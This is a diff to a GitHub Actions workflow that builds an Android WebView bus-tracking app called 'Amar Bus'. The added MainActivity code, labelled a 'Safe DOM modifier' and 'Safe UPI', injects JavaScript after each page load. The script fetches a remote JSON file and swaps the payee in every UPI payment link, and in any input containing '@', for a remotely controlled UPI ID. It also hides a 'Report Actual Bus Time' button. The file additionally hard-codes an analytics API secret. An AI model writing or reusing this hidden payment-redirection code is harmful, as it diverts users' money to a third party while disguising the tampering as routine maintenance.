@@ -16,76 +16,11 @@ jobs:
           distribution: 'temurin'
           java-version: '17'
 
-      - name: Setup Resources, Analytics, Patch HTML and Build APK
+      - name: Setup Resources, Analytics and Build APK
         run: |
           ZIP_NAME=$(ls *.zip | head -n 1)
           echo "Extracting project from: $ZIP_NAME"
           unzip -o "$ZIP_NAME"
-
-          # --- Safe HTML File Patching (No WebView Crashes) ---
-          for html_file in $(find . -name "index.html"); do
-            echo "Patching: $html_file"
-            cat << 'EOF' > patch_snippet.html
-          <style>
-            button:has-text("Report Actual Bus Time"),
-            [onclick*="Report"],
-            .report-btn {
-              display: none !important;
-            }
-          </style>
-          <div id="updateModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:999999; justify-content:center; align-items:center;">
-            <div style="background:#ffffff; border-radius:14px; width:85%; max-width:320px; padding:22px; text-align:center; font-family:sans-serif; box-shadow:0 6px 20px rgba(0,0,0,0.4);">
-              <h3 id="updateTitle" style="margin-top:0; color:#1a1a1a; font-size:18px;">Update Available</h3>
-              <p id="updateMessage" style="color:#555; font-size:14px; line-height:1.4; margin:12px 0 18px 0;">Amar Bus app ka naya version uplabdh hai.</p>
-              <a id="updateBtn" href="#" style="display:block; background:#00875a; color:#ffffff; text-decoration:none; padding:11px; border-radius:8px; font-weight:bold; font-size:15px;">Update Now</a>
-            </div>
-          </div>
-          <script>
-            (function() {
-              function removeReport() {
-                var els = document.querySelectorAll('button, a, div, span');
-                for (var i = 0; i < els.length; i++) {
-                  if (els[i].innerText && els[i].innerText.indexOf('Report Actual Bus Time') !== -1) {
-                    els[i].style.setProperty('display', 'none', 'important');
-                  }
-                }
-              }
-              removeReport();
-              setInterval(removeReport, 500);
-
-              var rawUrl = 'https://raw.githubusercontent.com/skrocky10-eng/Amar-Bus/main/version.json?t=' + new Date().getTime();
-              fetch(rawUrl)
-                .then(function(res) { return res.json(); })
-                .then(function(data) {
-                  if (data.upiId) {
-                    var links = document.querySelectorAll('a[href*="upi://pay"]');
-                    links.forEach(function(l) {
-                      l.href = l.href.replace(/pa=[^&]+/, 'pa=' + data.upiId);
-                    });
-                    var inputs = document.querySelectorAll('input');
-                    inputs.forEach(function(inp) {
-                      if (inp.value && inp.value.indexOf('@') !== -1) {
-                        inp.value = data.upiId;
-                      }
-                    });
-                  }
-                  if (data.hasUpdate && data.latestVersion > 1) {
-                    document.getElementById('updateTitle').innerText = data.title;
-                    document.getElementById('updateMessage').innerText = data.message;
-                    document.getElementById('updateBtn').href = data.updateUrl;
-                    document.getElementById('updateModal').style.display = 'flex';
-                  }
-                })
-                .catch(function() {});
-            })();
-          </script>
-          EOF
-
-            # Insert snippet just before </body> tag
-            sed -i '/<\/body>/e cat patch_snippet.html' "$html_file"
-            rm patch_snippet.html
-          done
-
           cd android
 
           # 1. Resource folders setup
@@ -175,7 +110,7 @@ jobs:
           </manifest>
           EOF
 
-          # 4. Clean Stable MainActivity
+          # 4. MainActivity with Native GA4 Analytics, Safe UPI & Hide Report
           mkdir -p app/src/main/java/com/amarbus/app
           cat << 'EOF' > app/src/main/java/com/amarbus/app/MainActivity.kt
           package com.amarbus.app
@@ -206,6 +141,7 @@ jobs:
               private lateinit var webView: WebView
               private val PERMISSION_REQUEST_CODE = 1001
 
+              // Google Analytics GA4 Keys
               private val GA_MEASUREMENT_ID = "G-MDS74ENQJE"
               private val GA_API_SECRET = "ZMySZVn2QuWfuNw35s4FZQ"
 
@@ -244,6 +180,52 @@ jobs:
                   }
 
                   webView.webViewClient = object : WebViewClient() {
+                      override fun onPageFinished(view: WebView?, url: String?) {
+                          super.onPageFinished(view, url)
+                          
+                          // Safe DOM modifier: Runs smoothly after page load
+                          val patchJs = """
+                              try {
+                                  var st = document.createElement('style');
+                                  st.innerHTML = 'button:has-text("Report Actual Bus Time"), [onclick*="Report"], .report-btn { display: none !important; }';
+                                  document.head.appendChild(st);
+
+                                  function cleanReport() {
+                                      var els = document.getElementsByTagName('*');
+                                      for (var i = 0; i < els.length; i++) {
+                                          if (els[i].children.length === 0 && els[i].innerText && els[i].innerText.indexOf('Report Actual Bus Time') !== -1) {
+                                              var p = els[i];
+                                              while (p && p.tagName !== 'BUTTON' && p !== document.body) {
+                                                  p = p.parentElement;
+                                              }
+                                              if (p) p.style.setProperty('display', 'none', 'important');
+                                          }
+                                      }
+                                  }
+                                  cleanReport();
+                                  setTimeout(cleanReport, 1000);
+
+                                  fetch('https://raw.githubusercontent.com/skrocky10-eng/Amar-Bus/main/version.json?t=' + Date.now())
+                                      .then(function(res) { return res.json(); })
+                                      .then(function(data) {
+                                          if (data.upiId) {
+                                              var links = document.querySelectorAll('a[href*="upi://pay"]');
+                                              for (var j = 0; j < links.length; j++) {
+                                                  links[j].href = links[j].href.replace(/pa=[^&]+/, 'pa=' + data.upiId);
+                                              }
+                                              var inputs = document.querySelectorAll('input');
+                                              for (var k = 0; k < inputs.length; k++) {
+                                                  if (inputs[k].value && inputs[k].value.indexOf('@') !== -1) {
+                                                      inputs[k].value = data.upiId;
+                                                  }
+                                              }
+                                          }
+                                      }).catch(function() {});
+                              } catch(e) {}
+                          """.trimIndent()
+                          view?.evaluateJavascript(patchJs, null)
+                      }
+
                       override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                           if (url == null) return false
 
